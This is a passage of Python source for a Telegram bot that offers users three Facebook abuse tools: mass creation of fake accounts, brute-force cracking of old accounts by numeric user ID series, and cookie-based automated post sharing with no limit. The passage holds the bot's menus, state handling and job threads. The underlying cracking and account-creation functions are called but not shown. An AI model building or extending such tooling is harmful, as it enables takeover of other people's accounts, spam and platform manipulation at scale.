        set_state(user_id, tool="crack", series=series)
        tg_edit(
            chat_id, message_id,
            f"🔓 <b>Crack</b> — {series_label}\n\n"
            f"How many UIDs to try?\n"
            f"Send a number (no limit):",
            reply_markup={"inline_keyboard": [make_button_row(("🔙 Cancel", "menu_crack"))]},
        )

    elif data == "menu_share":
        tg_edit(
            chat_id, message_id,
            "🚀 <b>Share Boost</b> — Cookie-Based Post Sharer\n\n"
            "Shares Facebook posts using your account cookie.\n\n"
            "Send your Facebook cookie string:",
            reply_markup={"inline_keyboard": [make_button_row(("🔙 Cancel", "main_menu"))]},
        )
        set_state(user_id, tool="share", awaiting="cookie")

    elif data == "help":
        help_text = (
            "❓ <b>Help — Premium Tools Bot</b>\n\n"
            "<b>Commands:</b>\n"
            "/start — Main menu\n"
            "/help — This help message\n\n"
            "<b>Tools:</b>\n"
            "🛠 <b>Create</b> — Creates real FB accounts (AU2 FM Maker)\n"
            "🔓 <b>Crack</b> — Brute forces old FB accounts (FB Clone)\n"
            "🚀 <b>Share Boost</b> — Shares posts via cookies (NIKA Sharer)\n\n"
            "<b>Note:</b> Admin approval required before tool access."
        )
        tg_edit(chat_id, message_id, help_text,
                reply_markup={"inline_keyboard": [make_button_row(("🔙 Back", "main_menu"))]})


def handle_message(message: dict):
    chat_id = message["chat"]["id"]
    user_id = message["from"]["id"]
    username = message["from"].get("username", str(user_id))
    first_name = message["from"].get("first_name", "User")
    text = message.get("text", "")

    if text.startswith("/start"):
        handle_start(message)
        return
    elif text.startswith("/help"):
        tg_send(
            chat_id,
            "❓ <b>Help</b>\n\n/start — Main menu\n/help — Help\n\nUse buttons to navigate.",
            reply_markup=MAIN_MENU_KEYBOARD,
        )
        return

    if not require_approved(chat_id, user_id, username):
        return

    if not is_bot_enabled():
        tg_send(chat_id, "🔴 Bot is currently offline.")
        return

    state = get_state(user_id)
    tool = state.get("tool")
    awaiting = state.get("awaiting")

    # ── CREATE TOOL ──
    if tool == "create" and not awaiting:
        try:
            count = int(text.strip())
            if count < 1:
                raise ValueError
        except ValueError:
            tg_send(chat_id, "❌ Send a valid positive number.")
            return

        method = state.get("method", "phone")
        method_label = {"phone": "BD Phone", "mix": "Mix Phone", "mail": "Temp Mail"}.get(method, method)
        set_state(user_id, awaiting="create_running")

        log_to_api("create", str(user_id), username, "create_start", "info",
                   f"Starting account creation: {method}, count={count}")

        msg = tg_send(
            chat_id,
            f"🛠 <b>Create</b> starting...\n"
            f"Method: {method_label} | Count: {count}\n\n"
            f"⏳ Working...",
        )
        msg_id = msg.get("result", {}).get("message_id")

        def run_create():
            ok = 0
            lines = []
            for kind, line in create_fb_accounts(method, count):
                if kind == "ok":
                    ok += 1
                    lines.append(line)
                    if ok % 5 == 0 and msg_id:
                        tg_edit(chat_id, msg_id,
                                f"🛠 <b>Create</b> — Progress\n\n"
                                + "\n".join(lines[-10:]) +
                                f"\n\n⏳ {ok}/{count} done...")
                elif kind == "done":
                    tg_send(chat_id, line,
                            reply_markup={"inline_keyboard": [
                                make_button_row(("🛠 Create More", "menu_create")),
                                make_button_row(("🔙 Main Menu", "main_menu")),
                            ]})
                    log_to_api("create", str(user_id), username, "create_done", "success",
                               f"Created {ok}/{count} accounts")
                elif kind in ("fail", "err", "cp") and len(lines) < 50:
                    lines.append(line)

            clear_state(user_id)

        threading.Thread(target=run_create, daemon=True).start()

    # ── CRACK TOOL ──
    elif tool == "crack" and not awaiting:
        try:
            count = int(text.strip())
            if count < 1:
                raise ValueError
        except ValueError:
            tg_send(chat_id, "❌ Send a valid positive number.")
            return

        series = state.get("series", "all")
        series_label = {"all": "All Series", "100003": "100003-4", "2009": "2009"}.get(series, series)
        set_state(user_id, awaiting="crack_running")

        log_to_api("crack", str(user_id), username, "crack_start", "info",
                   f"Starting crack: series={series}, count={count}")

        msg = tg_send(
            chat_id,
            f"🔓 <b>Crack</b> starting...\n"
            f"Series: {series_label} | Trying: {count} UIDs\n\n"
            f"⏳ Working...",
        )
        msg_id = msg.get("result", {}).get("message_id")

        def run_crack():
            found = 0
            for kind, line in crack_accounts(series, count):
                if kind == "found":
                    found += 1
                    tg_send(chat_id, line)
                    log_to_api("crack", str(user_id), username, "crack_found", "success", line)
                elif kind == "progress" and msg_id:
                    tg_edit(chat_id, msg_id,
                            f"🔓 <b>Crack</b> — Running\n\n{line}")
                elif kind == "done":
                    tg_send(chat_id, line,
                            reply_markup={"inline_keyboard": [
                                make_button_row(("🔓 Crack More", "menu_crack")),
                                make_button_row(("🔙 Main Menu", "main_menu")),
                            ]})
                    log_to_api("crack", str(user_id), username, "crack_done", "info",
                               f"Crack done: {found} found")
            clear_state(user_id)

        threading.Thread(target=run_crack, daemon=True).start()

    # ── SHARE BOOST TOOL ──
    elif tool == "share":
        if awaiting == "cookie":
            set_state(user_id, cookie=text.strip(), awaiting="share_url")
            tg_send(chat_id,
                    "🚀 <b>Share Boost</b>\n\nCookie saved ✅\n\nNow send the Facebook post URL to share:")

        elif awaiting == "share_url":
            set_state(user_id, url=text.strip(), awaiting="share_count")
            tg_send(chat_id,
                    "🚀 <b>Share Boost</b>\n\nURL saved ✅\n\nHow many times to share? (no limit)\nSend a number:")

        elif awaiting == "share_count":
            try:
                count = int(text.strip())
                if count < 1:
                    raise ValueError
            except ValueError:
                tg_send(chat_id, "❌ Send a valid positive number.")
                return

            cookie = state.get("cookie", "")
            url = state.get("url", "")
            set_state(user_id, awaiting="share_running")

            log_to_api("share", str(user_id), username, "share_start", "info",
                       f"Starting share boost: count={count}, url={url[:50]}")

            msg = tg_send(
                chat_id,
                f"🚀 <b>Share Boost</b> starting...\n"
                f"URL: <code>{url[:50]}</code>\n"
                f"Count: {count}\n\n"
                f"⏳ Extracting token...",
            )
            msg_id = msg.get("result", {}).get("message_id")

            def run_share():
                for kind, line in share_boost_run(cookie, url, count):
                    if kind == "error":
                        tg_send(chat_id, line,
                                reply_markup={"inline_keyboard": [
                                    make_button_row(("🚀 Try Again", "menu_share")),
                                    make_button_row(("🔙 Main Menu", "main_menu")),
                                ]})
                        clear_state(user_id)
                        return
                    elif kind == "progress" and msg_id:
                        tg_edit(chat_id, msg_id,
                                f"🚀 <b>Share Boost</b> — Running\n\n{line}")
                    elif kind == "done":
                        tg_send(chat_id, line,
                                reply_markup={"inline_keyboard": [
                                    make_button_row(("🚀 Share Again", "menu_share")),
                                    make_button_row(("🔙 Main Menu", "main_menu")),
                                ]})
                        log_to_api("share", str(user_id), username, "share_done", "success", line)
                clear_state(user_id)

            threading.Thread(target=run_share, daemon=True).start()

    else:
        tg_send(chat_id,
                "Use /start to open the main menu.",
                reply_markup={"inline_keyboard": [make_button_row(("🏠 Main Menu", "main_menu"))]})


def poll():
    offset = None
    logger.info(f"Bot polling started. Token: {BOT_TOKEN[:15]}...")

    while True:
        try:
            params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
            if offset is not None:
                params["offset"] = offset

            r = requests.get(f"{TELEGRAM_API}/getUpdates", params=params, timeout=40)
            if not r.ok:
                logger.warning(f"getUpdates failed: {r.status_code} {r.text[:100]}")
                time.sleep(5)
                continue

            data = r.json()
            updates = data.get("result", [])

            for update in updates:
                offset = update["update_id"] + 1
                try:
                    if "callback_query" in update:
                        handle_callback(update["callback_query"])
                    elif "message" in update:
                        handle_message(update["message"])
                except Exception as e:
                    logger.error(f"Error handling update {update.get('update_id')}: {e}")

        except requests.exceptions.Timeout:
            continue
        except KeyboardInterrupt:
            logger.info("Bot stopped by KeyboardInterrupt")
            break
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)


def delete_webhook():
    try:
        r = requests.post(f"{TELEGRAM_API}/deleteWebhook", json={"drop_pending_updates": True}, timeout=10)
        data = r.json()
        if data.get("ok"):
            logger.info("Webhook deleted, starting long-poll mode")
        else:
            logger.warning(f"deleteWebhook response: {data}")
    except Exception as e:
        logger.warning(f"Could not delete webhook: {e}")


if __name__ == "__main__":
    logger.info("Starting Telegram bot with real tool code...")
    delete_webhook()
    poll()
